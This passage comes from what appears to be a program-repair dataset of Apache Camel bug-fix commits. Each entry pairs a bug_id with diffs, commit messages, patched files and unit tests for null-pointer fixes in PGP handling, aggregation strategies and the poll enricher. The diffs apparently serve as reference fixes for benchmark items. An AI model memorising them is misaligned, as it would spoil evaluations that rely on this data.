signature\");\n+            throw new IllegalArgumentException(\"No public key found fitting to the signature key Id; cannot verify the signature.\");\n         }\n \n     }",
                "raw_url": "https://github.com/apache/camel/raw/9ea05aae64256ad652235865ad6c0f31a00e682a/components/camel-crypto/src/main/java/org/apache/camel/converter/crypto/PGPKeyAccessDataFormat.java",
                "sha": "92663c485c2982dc523498eb7674e1e4c1f129ea",
                "status": "modified"
            },
            {
                "additions": 261,
                "blob_url": "https://github.com/apache/camel/blob/9ea05aae64256ad652235865ad6c0f31a00e682a/components/camel-crypto/src/test/java/org/apache/camel/converter/crypto/PGPDataFormatTest.java",
                "changes": 279,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-crypto/src/test/java/org/apache/camel/converter/crypto/PGPDataFormatTest.java?ref=9ea05aae64256ad652235865ad6c0f31a00e682a",
                "deletions": 18,
                "filename": "components/camel-crypto/src/test/java/org/apache/camel/converter/crypto/PGPDataFormatTest.java",
                "patch": "@@ -16,13 +16,21 @@\n  */\n package org.apache.camel.converter.crypto;\n \n+import java.io.BufferedOutputStream;\n+import java.io.ByteArrayInputStream;\n import java.io.ByteArrayOutputStream;\n import java.io.IOException;\n import java.io.InputStream;\n+import java.io.OutputStream;\n+import java.io.PrintWriter;\n+import java.io.UnsupportedEncodingException;\n+import java.security.SecureRandom;\n import java.util.ArrayList;\n import java.util.Arrays;\n import java.util.Collections;\n+import java.util.Date;\n import java.util.HashMap;\n+import java.util.Iterator;\n import java.util.List;\n import java.util.Map;\n \n@@ -31,14 +39,36 @@\n import org.apache.camel.builder.RouteBuilder;\n import org.apache.camel.component.mock.MockEndpoint;\n import org.apache.camel.util.IOHelper;\n+import org.bouncycastle.bcpg.BCPGOutputStream;\n import org.bouncycastle.bcpg.CompressionAlgorithmTags;\n import org.bouncycastle.bcpg.HashAlgorithmTags;\n import org.bouncycastle.bcpg.SymmetricKeyAlgorithmTags;\n import org.bouncycastle.bcpg.sig.KeyFlags;\n+import org.bouncycastle.openpgp.PGPCompressedDataGenerator;\n+import org.bouncycastle.openpgp.PGPEncryptedDataGenerator;\n+import org.bouncycastle.openpgp.PGPException;\n+import org.bouncycastle.openpgp.PGPLiteralData;\n+import org.bouncycastle.openpgp.PGPLiteralDataGenerator;\n+import org.bouncycastle.openpgp.PGPPrivateKey;\n+import org.bouncycastle.openpgp.PGPPublicKey;\n+import org.bouncycastle.openpgp.PGPPublicKeyRing;\n+import org.bouncycastle.openpgp.PGPPublicKeyRingCollection;\n+import org.bouncycastle.openpgp.PGPSecretKey;\n+import org.bouncycastle.openpgp.PGPSecretKeyRing;\n+import org.bouncycastle.openpgp.PGPSecretKeyRingCollection;\n+import org.bouncycastle.openpgp.PGPSignature;\n+import org.bouncycastle.openpgp.PGPSignatureGenerator;\n+import org.bouncycastle.openpgp.PGPUtil;\n+import org.bouncycastle.openpgp.operator.jcajce.JcaPGPContentSignerBuilder;\n+import org.bouncycastle.openpgp.operator.jcajce.JcePBEKeyEncryptionMethodGenerator;\n+import org.bouncycastle.openpgp.operator.jcajce.JcePBESecretKeyDecryptorBuilder;\n+import org.bouncycastle.openpgp.operator.jcajce.JcePGPDataEncryptorBuilder;\n+import org.bouncycastle.openpgp.operator.jcajce.JcePublicKeyKeyEncryptionMethodGenerator;\n import org.junit.Test;\n \n public class PGPDataFormatTest extends AbstractPGPDataFormatTest {\n \n+    private static final String PUB_KEY_RING_SUBKEYS_FILE_NAME = \"org/apache/camel/component/crypto/pubringSubKeys.gpg\";\n     private static final String SEC_KEY_RING_FILE_NAME = \"org/apache/camel/component/crypto/secring.gpg\";\n     private static final String PUB_KEY_RING_FILE_NAME = \"org/apache/camel/component/crypto/pubring.gpg\";\n \n@@ -143,10 +173,7 @@ public void testVerifyExceptionNoPublicKeyFoundCorrespondingToSignatureUserIds()\n         template.sendBodyAndHeaders(\"direct:verify_exception_sig_userids\", payload, headers);\n         assertMockEndpointsSatisfied();\n \n-        //check exception text\n-        Exception e = (Exception) exception.getExchanges().get(0).getProperty(Exchange.EXCEPTION_CAUGHT);\n-        assertNotNull(\"Expected excpetion  missing\", e);\n-        assertTrue(e.getMessage().contains(\"No public key found fitting to the signature key Id\"));\n+        checkThrownException(exception, IllegalArgumentException.class, null, \"No public key found fitting to the signature key Id\");\n \n     }\n \n@@ -163,11 +190,7 @@ public void testVerifyExceptionNoPassphraseSpecifiedForSignatureKeyUserId() thro\n         template.sendBodyAndHeaders(\"direct:several-signer-keys\", payload, headers);\n         assertMockEndpointsSatisfied();\n \n-        //check exception text\n-        Exception e = (Exception) exception.getExchanges().get(0).getProperty(Exchange.EXCEPTION_CAUGHT);\n-        assertNotNull(\"Expected excpetion  missing\", e);\n-        assertTrue(e.getMessage().contains(\"No passphrase specified for signature key user ID\"));\n-\n+        checkThrownException(exception, IllegalArgumentException.class, null, \"No passphrase specified for signature key user ID\");\n     }\n \n     /**\n@@ -195,7 +218,7 @@ public void testKeyFlagSelectsCorrectKey() throws Exception {\n         assertEquals(1, inMess.getHeader(PGPDataFormat.NUMBER_OF_ENCRYPTION_KEYS));\n         assertEquals(1, inMess.getHeader(PGPDataFormat.NUMBER_OF_SIGNING_KEYS));\n     }\n-    \n+\n     /**\n      * You get three keys with the UserId \"keyflag\", a primary key and its two\n      * sub-keys. The sub-key with KeyFlag {@link KeyFlags#SIGN_DATA} should be\n@@ -204,10 +227,11 @@ public void testKeyFlagSelectsCorrectKey() throws Exception {\n      * {@link KeyFlags#ENCRYPT_STORAGE} should be used for decryption.\n      * <p>\n      * Tests also the decryption and verifying part with the subkeys.\n+     * \n      * @throws Exception\n      */\n     @Test\n-    public void testDecryptVerifyWithSubkey() throws Exception {       \n+    public void testDecryptVerifyWithSubkey() throws Exception {\n         // do not use doRoundTripEncryptionTests(\"direct:subkey\"); because otherwise you get an error in the dynamic test\n         String payload = \"Test Message\";\n         MockEndpoint mockSubkey = getMockEndpoint(\"mock:unencrypted\");\n@@ -216,11 +240,190 @@ public void testDecryptVerifyWithSubkey() throws Exception {\n         assertMockEndpointsSatisfied();\n     }\n \n+    @Test\n+    public void testEmptyBody() throws Exception {\n+        String payload = \"\";\n+        MockEndpoint mockSubkey = getMockEndpoint(\"mock:unencrypted\");\n+        mockSubkey.expectedBodiesReceived(payload);\n+        template.sendBody(\"direct:subkey\", payload);\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Test\n+    public void testExceptionDecryptorIncorrectInputFormatNoPGPMessage() throws Exception {\n+        String payload = \"Not Correct Format\";\n+        MockEndpoint mock = getMockEndpoint(\"mock:exception\");\n+        mock.expectedMessageCount(1);\n+        template.sendBody(\"direct:subkeyUnmarshal\", payload);\n+        assertMockEndpointsSatisfied();\n+\n+        checkThrownException(mock, IllegalArgumentException.class, null, \"The input message body has an invalid format.\");\n+    }\n+\n+    @Test\n+    public void testExceptionDecryptorIncorrectInputFormatPGPSignedData() throws Exception {\n+\n+        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n+        createSignature(bos);\n+        MockEndpoint mock = getMockEndpoint(\"mock:exception\");\n+        mock.expectedMessageCount(1);\n+        template.sendBody(\"direct:subkeyUnmarshal\", bos.toByteArray());\n+        assertMockEndpointsSatisfied();\n+\n+        checkThrownException(mock, IllegalArgumentException.class, null, \"The input message body has an invalid format.\");\n+    }\n+\n+    @Test\n+    public void testExceptionDecryptorIncorrectInputNoCompression() throws Exception {\n+        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n+\n+        createEncryptedNonCompressedData(bos, PUB_KEY_RING_SUBKEYS_FILE_NAME);\n+\n+        MockEndpoint mock = getMockEndpoint(\"mock:exception\");\n+        mock.expectedMessageCount(1);\n+        template.sendBody(\"direct:subkeyUnmarshal\", bos.toByteArray());\n+        assertMockEndpointsSatisfied();\n+\n+        checkThrownException(mock, IllegalArgumentException.class, null, \"The input message body has an invalid format.\");\n+    }\n+\n+    @Test\n+    public void testExceptionDecryptorNoKeyFound() throws Exception {\n+        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n+\n+        createEncryptedNonCompressedData(bos, PUB_KEY_RING_FILE_NAME);\n+\n+        MockEndpoint mock = getMockEndpoint(\"mock:exception\");\n+        mock.expectedMessageCount(1);\n+        template.sendBody(\"direct:subkeyUnmarshal\", bos.toByteArray());\n+        assertMockEndpointsSatisfied();\n+\n+        checkThrownException(mock, PGPException.class, null,\n+                \"Message is encrypted with a key which could not be found in the Secret Key Ring\");\n+    }\n+\n+    void createEncryptedNonCompressedData(ByteArrayOutputStream bos, String keyringPath) throws Exception, IOException, PGPException,\n+            UnsupportedEncodingException {\n+        PGPEncryptedDataGenerator encGen = new PGPEncryptedDataGenerator(new JcePGPDataEncryptorBuilder(SymmetricKeyAlgorithmTags.CAST5)\n+                .setSecureRandom(new SecureRandom()).setProvider(getProvider()));\n+        encGen.addMethod(new JcePublicKeyKeyEncryptionMethodGenerator(readPublicKey(keyringPath)));\n+        OutputStream encOut = encGen.open(bos, new byte[512]);\n+        PGPLiteralDataGenerator litData = new PGPLiteralDataGenerator();\n+        OutputStream litOut = litData.open(encOut, PGPLiteralData.BINARY, PGPLiteralData.CONSOLE, new Date(), new byte[512]);\n+\n+        try {\n+            litOut.write(\"Test Message Without Compression\".getBytes(\"UTF-8\"));\n+            litOut.flush();\n+        } finally {\n+            IOHelper.close(litOut);\n+            IOHelper.close(encOut, bos);\n+        }\n+    }\n+\n+    private void createSignature(OutputStream out) throws Exception {\n+        PGPSecretKey pgpSec = readSecretKey();\n+        PGPPrivateKey pgpPrivKey = pgpSec.extractPrivateKey(new JcePBESecretKeyDecryptorBuilder().setProvider(getProvider()).build(\n+                \"sdude\".toCharArray()));\n+        PGPSignatureGenerator sGen = new PGPSignatureGenerator(new JcaPGPContentSignerBuilder(pgpSec.getPublicKey().getAlgorithm(),\n+                PGPUtil.SHA1).setProvider(getProvider()));\n+\n+        sGen.init(PGPSignature.BINARY_DOCUMENT, pgpPrivKey);\n+\n+        BCPGOutputStream bOut = new BCPGOutputStream(out);\n+\n+        InputStream fIn = new ByteArrayInputStream(\"Test Signature\".getBytes(\"UTF-8\"));\n+\n+        int ch;\n+        while ((ch = fIn.read()) >= 0) {\n+            sGen.update((byte) ch);\n+        }\n+\n+        fIn.close();\n+\n+        sGen.generate().encode(bOut);\n+\n+    }\n+\n+    static PGPSecretKey readSecretKey() throws Exception {\n+        InputStream input = new ByteArrayInputStream(getSecKeyRing());\n+        PGPSecretKeyRingCollection pgpSec = new PGPSecretKeyRingCollection(PGPUtil.getDecoderStream(input));\n+\n+        @SuppressWarnings(\"rawtypes\")\n+        Iterator keyRingIter = pgpSec.getKeyRings();\n+        while (keyRingIter.hasNext()) {\n+            PGPSecretKeyRing keyRing = (PGPSecretKeyRing) keyRingIter.next();\n+\n+            @SuppressWarnings(\"rawtypes\")\n+            Iterator keyIter = keyRing.getSecretKeys();\n+            while (keyIter.hasNext()) {\n+                PGPSecretKey key = (PGPSecretKey) keyIter.next();\n+\n+                if (key.isSigningKey()) {\n+                    return key;\n+                }\n+            }\n+        }\n+\n+        throw new IllegalArgumentException(\"Can't find signing key in key ring.\");\n+    }\n+\n+    static PGPPublicKey readPublicKey(String keyringPath) throws Exception {\n+        InputStream input = new ByteArrayInputStream(getKeyRing(keyringPath));\n+        PGPPublicKeyRingCollection pgpPub = new PGPPublicKeyRingCollection(PGPUtil.getDecoderStream(input));\n+\n+        @SuppressWarnings(\"rawtypes\")\n+        Iterator keyRingIter = pgpPub.getKeyRings();\n+        while (keyRingIter.hasNext()) {\n+            PGPPublicKeyRing keyRing = (PGPPublicKeyRing) keyRingIter.next();\n+\n+            @SuppressWarnings(\"rawtypes\")\n+            Iterator keyIter = keyRing.getPublicKeys();\n+            while (keyIter.hasNext()) {\n+                PGPPublicKey key = (PGPPublicKey) keyIter.next();\n+\n+                if (key.isEncryptionKey()) {\n+                    return key;\n+                }\n+            }\n+        }\n+\n+        throw new IllegalArgumentException(\"Can't find encryption key in key ring.\");\n+    }\n+\n+    @Test\n+    public void testExceptionDecryptorIncorrectInputFormatSymmetricEncryptedData() throws Exception {\n+\n+        byte[] payload = \"Not Correct Format\".getBytes(\"UTF-8\");\n+        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n+\n+        PGPEncryptedDataGenerator encGen = new PGPEncryptedDataGenerator(new JcePGPDataEncryptorBuilder(SymmetricKeyAlgorithmTags.CAST5)\n+                .setSecureRandom(new SecureRandom()).setProvider(getProvider()));\n+\n+        encGen.addMethod(new JcePBEKeyEncryptionMethodGenerator(\"pw\".toCharArray()));\n+\n+        OutputStream encOut = encGen.open(bos, new byte[1024]);\n+        PGPCompressedDataGenerator comData = new PGPCompressedDataGenerator(CompressionAlgorithmTags.ZIP);\n+        OutputStream comOut = new BufferedOutputStream(comData.open(encOut));\n+        PGPLiteralDataGenerator litData = new PGPLiteralDataGenerator();\n+        OutputStream litOut = litData.open(comOut, PGPLiteralData.BINARY, PGPLiteralData.CONSOLE, new Date(), new byte[1024]);\n+        litOut.write(payload);\n+        litOut.flush();\n+        litOut.close();\n+        comOut.close();\n+        encOut.close();\n+        MockEndpoint mock = getMockEndpoint(\"mock:exception\");\n+        mock.expectedMessageCount(1);\n+        template.sendBody(\"direct:subkeyUnmarshal\", bos.toByteArray());\n+        assertMockEndpointsSatisfied();\n+\n+        checkThrownException(mock, IllegalArgumentException.class, null, \"The input message body has an invalid format.\");\n+    }\n+\n     protected RouteBuilder[] createRouteBuilders() {\n         return new RouteBuilder[] {new RouteBuilder() {\n             public void configure() throws Exception {\n \n-                onException(IllegalArgumentException.class).handled(true).to(\"mock:exception\");\n+                onException(Exception.class).handled(true).to(\"mock:exception\");\n \n                 // START SNIPPET: pgp-format\n                 // Public Key FileName\n@@ -404,27 +607,30 @@ public void configure() throws Exception {\n \n         }, new RouteBuilder() {\n             public void configure() throws Exception {\n+\n+                onException(Exception.class).handled(true).to(\"mock:exception\");\n                 // keyflag test\n                 PGPDataFormat pgpKeyFlag = new PGPDataFormat();\n                 // the following keyring contains a primary key with KeyFlag \"Certify\" and a subkey for signing and a subkey for encryption\n-                pgpKeyFlag.setKeyFileName(\"org/apache/camel/component/crypto/pubringSubKeys.gpg\");\n+                pgpKeyFlag.setKeyFileName(PUB_KEY_RING_SUBKEYS_FILE_NAME);\n                 pgpKeyFlag.setSignatureKeyFileName(\"org/apache/camel/component/crypto/secringSubKeys.gpg\");\n                 pgpKeyFlag.setSignaturePassword(\"Abcd1234\");\n                 pgpKeyFlag.setKeyUserid(\"keyflag\");\n                 pgpKeyFlag.setSignatureKeyUserid(\"keyflag\");\n \n                 from(\"direct:keyflag\").marshal(pgpKeyFlag).to(\"mock:encrypted_keyflag\");\n-                \n+\n                 PGPDataFormat pgpDecryptVerifySubkey = new PGPDataFormat();\n                 // the following keyring contains a primary key with KeyFlag \"Certify\" and a subkey for signing and a subkey for encryption\n                 pgpDecryptVerifySubkey.setKeyFileName(\"org/apache/camel/component/crypto/secringSubKeys.gpg\");\n-                pgpDecryptVerifySubkey.setSignatureKeyFileName(\"org/apache/camel/component/crypto/pubringSubKeys.gpg\");\n+                pgpDecryptVerifySubkey.setSignatureKeyFileName(PUB_KEY_RING_SUBKEYS_FILE_NAME);\n                 pgpDecryptVerifySubkey.setPassword(\"Abcd1234\");\n                 pgpDecryptVerifySubkey.setSignatureKeyUserid(\"keyflag\");\n-                \n+\n                 // test that the correct subkey is selected during decrypt and verify\n-                from(\"direct:subkey\").marshal(pgpKeyFlag).to(\"mock:encrypted\").unmarshal(pgpDecryptVerifySubkey)\n-                .to(\"mock:unencrypted\");\n+                from(\"direct:subkey\").marshal(pgpKeyFlag).to(\"mock:encrypted\").unmarshal(pgpDecryptVerifySubkey).to(\"mock:unencrypted\");\n+\n+                from(\"direct:subkeyUnmarshal\").unmarshal(pgpDecryptVerifySubkey).to(\"mock:unencrypted\");\n             }\n         }, new RouteBuilder() {\n             public void configure() throws Exception {\n@@ -473,4 +679,41 @@ public static PGPPassphraseAccessor getPassphraseAccessor() {\n         return passphraseAccessor;\n     }\n \n+    public static void checkThrownException(MockEndpoint mock, Class<? extends Exception> cl,\n+            Class<? extends Exception> expectedCauseClass, String expectedMessagePart) throws Exception {\n+        Exception e = (Exception) mock.getExchanges().get(0).getProperty(Exchange.EXCEPTION_CAUGHT);\n+        assertNotNull(\"Expected excpetion \" + cl.getName() + \" missing\", e);\n+        if (e.getClass() != cl) {\n+            String stackTrace = getStrackTrace(e);\n+            fail(\"Exception  \" + cl.getName() + \" excpected, but was \" + e.getClass().getName() + \": \" + stackTrace);\n+        }\n+        if (expectedMessagePart != null) {\n+            if (e.getMessage() == null) {\n+                fail(\"Expected excption does not contain a message. Stack trace: \" + getStrackTrace(e));\n+            } else {\n+                if (!e.getMessage().contains(expectedMessagePart)) {\n+                    fail(\"Expected excption message does not contain a expected message part \" + expectedMessagePart + \".  Stack trace: \"\n+                            + getStrackTrace(e));\n+                }\n+            }\n+        }\n+        if (expectedCauseClass != null) {\n+            Throwable cause = e.getCause();\n+            assertNotNull(\"Expected cause exception\" + expectedCauseClass.getName() + \" missing\", cause);\n+            if (expectedCauseClass != cause.getClass()) {\n+                fail(\"Cause exception \" + expectedCauseClass.getName() + \" expected, but was \" + cause.getClass().getName() + \": \"\n+                        + getStrackTrace(e));\n+            }\n+        }\n+    }\n+\n+    public static String getStrackTrace(Exception e) throws UnsupportedEncodingException {\n+        ByteArrayOutputStream os = new ByteArrayOutputStream();\n+        PrintWriter w = new PrintWriter(os);\n+        e.printStackTrace(w);\n+        w.close();\n+        String stackTrace = new String(os.toByteArray(), \"UTF-8\");\n+        return stackTrace;\n+    }\n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/9ea05aae64256ad652235865ad6c0f31a00e682a/components/camel-crypto/src/test/java/org/apache/camel/converter/crypto/PGPDataFormatTest.java",
                "sha": "52377104b939b7685c1a5c5a52f20e5b3b5ae9ca",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7253 Fixed the NPE of PGPDataFormat if decryptor gets body with invalid format with thanks to Franz",
        "parent": "https://github.com/apache/camel/commit/cc54cb49de62ce16ab6ce880f23bf13a5125f775",
        "patched_files": [
            "PGPDataFormat.java",
            "PGPKeyAccessDataFormat.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "PGPDataFormatTest.java",
            "PGPKeyAccessDataFormatTest.java"
        ]
    },
    "camel_9edb823": {
        "bug_id": "camel_9edb823",
        "commit": "https://github.com/apache/camel/commit/9edb82323ae094fa2bf09bab1a8b7310310f96be",
        "file": [
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/9edb82323ae094fa2bf09bab1a8b7310310f96be/camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregationStrategy.java",
                "changes": 11,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregationStrategy.java?ref=9edb82323ae094fa2bf09bab1a8b7310310f96be",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregationStrategy.java",
                "patch": "@@ -28,9 +28,12 @@\n  * or remove some headers. And a more common use case is for instance to count some values from the body payload. That\n  * could be to sum up a total amount etc.\n  * <p/>\n- * Possible implementations include performing some kind of combining or delta\n- * processing, such as adding line items together into an invoice or just using\n- * the newest exchange and removing old exchanges such as for state tracking or\n+ * It is possible that <tt>newExchange</tt> is <tt>null</tt> which could happen if there was no data possible\n+ * to acquire. Such as when using a {@link org.apache.camel.processor.PollEnricher} to poll from a JMS queue which\n+ * is empty and a timeout was set.\n+ * <p/>\n+ * Possible implementations include performing some kind of combining or delta processing, such as adding line items\n+ * together into an invoice or just using the newest exchange and removing old exchanges such as for state tracking or\n  * market data prices; where old values are of little use.\n  * \n  * @version $Revision$\n@@ -41,7 +44,7 @@\n      * Aggregates an old and new exchange together to create a single combined exchange\n      *\n      * @param oldExchange the oldest exchange (is <tt>null</tt> on first aggregation as we only have the new exchange)\n-     * @param newExchange the newest exchange\n+     * @param newExchange the newest exchange (can be <tt>null</tt> if there was no data possible to acquire)\n      * @return a combined composite of the two exchanges\n      */\n     Exchange aggregate(Exchange oldExchange, Exchange newExchange);",
                "raw_url": "https://github.com/apache/camel/raw/9edb82323ae094fa2bf09bab1a8b7310310f96be/camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregationStrategy.java",
                "sha": "8d2c002e5525312db1f7aeb873342c406c15d0ec",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/9edb82323ae094fa2bf09bab1a8b7310310f96be/camel-core/src/main/java/org/apache/camel/processor/aggregate/GroupedExchangeAggregationStrategy.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/aggregate/GroupedExchangeAggregationStrategy.java?ref=9edb82323ae094fa2bf09bab1a8b7310310f96be",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/aggregate/GroupedExchangeAggregationStrategy.java",
                "patch": "@@ -44,7 +44,9 @@ public Exchange aggregate(Exchange oldExchange, Exchange newExchange) {\n             list = oldExchange.getProperty(Exchange.GROUPED_EXCHANGE, List.class);\n         }\n \n-        list.add(newExchange);\n+        if (newExchange != null) {\n+            list.add(newExchange);\n+        }\n         return answer;\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/9edb82323ae094fa2bf09bab1a8b7310310f96be/camel-core/src/main/java/org/apache/camel/processor/aggregate/GroupedExchangeAggregationStrategy.java",
                "sha": "336742bab024c192aac3a8fa3a1d3b98bc80de05",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/9edb82323ae094fa2bf09bab1a8b7310310f96be/camel-core/src/main/java/org/apache/camel/processor/aggregate/UseLatestAggregationStrategy.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/aggregate/UseLatestAggregationStrategy.java?ref=9edb82323ae094fa2bf09bab1a8b7310310f96be",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/aggregate/UseLatestAggregationStrategy.java",
                "patch": "@@ -28,6 +28,9 @@\n public class UseLatestAggregationStrategy implements AggregationStrategy {\n \n     public Exchange aggregate(Exchange oldExchange, Exchange newExchange) {\n+        if (newExchange == null) {\n+            return oldExchange;\n+        }\n         newExchange.setException(checkException(oldExchange, newExchange));\n         return newExchange;\n     }\n@@ -44,6 +47,6 @@ protected Exception checkException(Exchange oldExchange, Exchange newExchange) {\n \n     @Override\n     public String toString() {\n-        return \"useLatestAggregationStrategy\";\n+        return \"UseLatestAggregationStrategy\";\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/9edb82323ae094fa2bf09bab1a8b7310310f96be/camel-core/src/main/java/org/apache/camel/processor/aggregate/UseLatestAggregationStrategy.java",
                "sha": "0c478c62f577c22248ade4bb58430ffc68ec9d47",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/9edb82323ae094fa2bf09bab1a8b7310310f96be/components/camel-amqp/src/test/java/org/apache/camel/component/amqp/AMQPRouteTest.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-amqp/src/test/java/org/apache/camel/component/amqp/AMQPRouteTest.java?ref=9edb82323ae094fa2bf09bab1a8b7310310f96be",
                "deletions": 0,
                "filename": "components/camel-amqp/src/test/java/org/apache/camel/component/amqp/AMQPRouteTest.java",
                "patch": "@@ -25,6 +25,7 @@\n import org.junit.AfterClass;\n import org.junit.Before;\n import org.junit.BeforeClass;\n+import org.junit.Ignore;\n import org.junit.Test;\n \n import static org.apache.camel.component.amqp.AMQPComponent.amqpComponent;\n@@ -53,6 +54,7 @@ public static void shutdownBroker() {\n     \n \n     @Test\n+    @Ignore(\"AMQP testing is a bit unstable\")\n     public void testJmsRouteWithTextMessage() throws Exception {\n         String expectedBody = \"Hello there!\";\n \n@@ -78,6 +80,7 @@ public void testJmsRouteWithTextMessage() throws Exception {\n     }\n \n     @Test\n+    @Ignore(\"AMQP testing is a bit unstable\")\n     public void testJmsRouteWithObjectMessage() throws Exception {\n         PurchaseOrder expectedBody = new PurchaseOrder(\"Beer\", 10);\n \n@@ -90,6 +93,7 @@ public void testJmsRouteWithObjectMessage() throws Exception {\n     }\n \n     @Test\n+    @Ignore(\"AMQP testing is a bit unstable\")\n     public void testJmsRouteWithByteArrayMessage() throws Exception {\n         PurchaseOrder aPO = new PurchaseOrder(\"Beer\", 10);\n         byte[] expectedBody = SerializationUtils.serialize(aPO);",
                "raw_url": "https://github.com/apache/camel/raw/9edb82323ae094fa2bf09bab1a8b7310310f96be/components/camel-amqp/src/test/java/org/apache/camel/component/amqp/AMQPRouteTest.java",
                "sha": "f883a245742d7e7ef457ed32fbdfaef15019cb0c",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE in AggregationStrategy and updated its javadoc. Disabled AMQP testing as testing it is a bit unstable.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@885364 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/493335c7cc4ecf38dcbe5ad84c1f456e8e99c341",
        "patched_files": [
            "GroupedExchangeAggregationStrategy.java",
            "UseLatestAggregationStrategy.java",
            "AggregationStrategy.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "AMQPRouteTest.java"
        ]
    },
    "camel_9f8d96c": {
        "bug_id": "camel_9f8d96c",
        "commit": "https://github.com/apache/camel/commit/9f8d96c52cb491efdc867ace2418a79ea2685a42",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/9f8d96c52cb491efdc867ace2418a79ea2685a42/camel-core/src/main/java/org/apache/camel/processor/PollEnricher.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/PollEnricher.java?ref=9f8d96c52cb491efdc867ace2418a79ea2685a42",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/PollEnricher.java",
                "patch": "@@ -63,6 +63,7 @@ public PollEnricher(PollingConsumer consumer) {\n      *\n      * @param aggregationStrategy  aggregation strategy to aggregate input data and additional data.\n      * @param consumer consumer to resource endpoint.\n+     * @param timeout timeout in millis\n      */\n     public PollEnricher(AggregationStrategy aggregationStrategy, PollingConsumer consumer, long timeout) {\n         this.aggregationStrategy = aggregationStrategy;\n@@ -171,7 +172,8 @@ protected void preChceckPoll(Exchange exchange) throws Exception {\n         if (consumer instanceof EventDrivenPollingConsumer) {\n             EventDrivenPollingConsumer edpc = (EventDrivenPollingConsumer) consumer;\n             boolean fileBasedConsumer = edpc.getEndpoint().getEndpointKey().startsWith(\"file\") || edpc.getEndpoint().getEndpointKey().startsWith(\"ftp\");\n-            boolean fileBasedExchange = exchange.getFromEndpoint().getEndpointUri().startsWith(\"file\") || exchange.getFromEndpoint().getEndpointUri().startsWith(\"ftp\");\n+            boolean fileBasedExchange = exchange.getFromEndpoint() != null\n+                    && (exchange.getFromEndpoint().getEndpointUri().startsWith(\"file\") || exchange.getFromEndpoint().getEndpointUri().startsWith(\"ftp\"));\n             if (fileBasedConsumer && fileBasedExchange) {\n                 throw new IllegalArgumentException(\"Camel currently does not support pollEnrich from a file/ftp endpoint\"\n                         + \" when the route also started from a file/ftp endpoint.\"",
                "raw_url": "https://github.com/apache/camel/raw/9f8d96c52cb491efdc867ace2418a79ea2685a42/camel-core/src/main/java/org/apache/camel/processor/PollEnricher.java",
                "sha": "8112ba72d2e725fa015e6db840efb9058ea5b41e",
                "status": "modified"
            }
        ],
        "message": "MR-332: Avoid NPE if from endpoint is null\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@931012 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/d2b74c85263bf8398254234b209c55628343b0cf",
        "patched_files": [
            "PollEnricher.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "PollEnricherTest.java"
        ]
    },
    "camel_a2a701d": {
        "bug_id": "camel_a2a701d",
        "commit": "https://github.com/apache/camel/commit/a2a701d84d89d92ef7bc36b929a9b660b15365d1",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/a2a701d84d89d92ef7bc36b929a9b660b15365d1/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java?ref=a2a701d84d89d92ef7bc36b929a9b660b15365d1",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "patch": "@@ -656,7 +656,7 @@ public static Properties getCamelPropertiesWithPrefix(String prefix, CamelContex\n         if (camelProperties != null) {\n             for (Map.Entry<String, String> entry : camelProperties.entrySet()) {\n                 String key = entry.getKey();\n-                if (key.startsWith(prefix)) {\n+                if (key != null && key.startsWith(prefix)) {\n                     answer.put(key.substring(prefix.length()), entry.getValue());\n                 }\n             }",
                "raw_url": "https://github.com/apache/camel/raw/a2a701d84d89d92ef7bc36b929a9b660b15365d1/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "sha": "1fb10f6d28a8dbf3facc65fabc60ed5a580f7bc0",
                "status": "modified"
            }
        ],
        "message": "CAMEL-5682: Fixed possible NPE\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1394388 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/b42e22dd4ad4f341c96fb20dc1de6fc068bfedd3",
        "patched_files": [
            "ObjectHelper.java"
        ],
        "repo": "camel",
